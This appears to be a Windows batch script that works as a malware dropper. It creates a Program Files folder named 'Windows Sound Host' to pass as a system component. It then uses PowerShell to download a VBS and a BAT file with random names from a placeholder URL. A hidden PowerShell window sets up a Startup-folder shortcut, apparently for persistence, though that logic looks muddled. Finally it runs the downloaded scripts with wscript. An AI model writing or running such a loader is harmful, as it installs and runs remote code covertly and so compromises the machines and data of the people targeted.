@echo off 
cd \ 
cd c:\"program files "
mkdir Windows Sound Host
cd Windows Sound Host 
set path1= C:\"program files"\"Windows Sound Host\" 

powershell -NoLogo -NonInteractive Invoke-WebRequest 'gitURL' -Outfile ./15a65da65s1d8w86s51d8aw.vbs; Invoke-WebRequest 'gitURL' -Outfile ./116161as5d1a5d3a21sd51aw13s1d85aw1d35.bat 
powershell -NoLogo -NonInteractive -WindowStyle hidden -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('C:\program files\Windows Sound Host\');$s.TargetPath='%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup';$s.Save()" 
timeout 150
wscript.exe "%path1%15a65da65s1d8w86s51d8aw.vbs" "%path%116161as5d1a5d3a21sd51aw13s1d85aw1d35.bat"
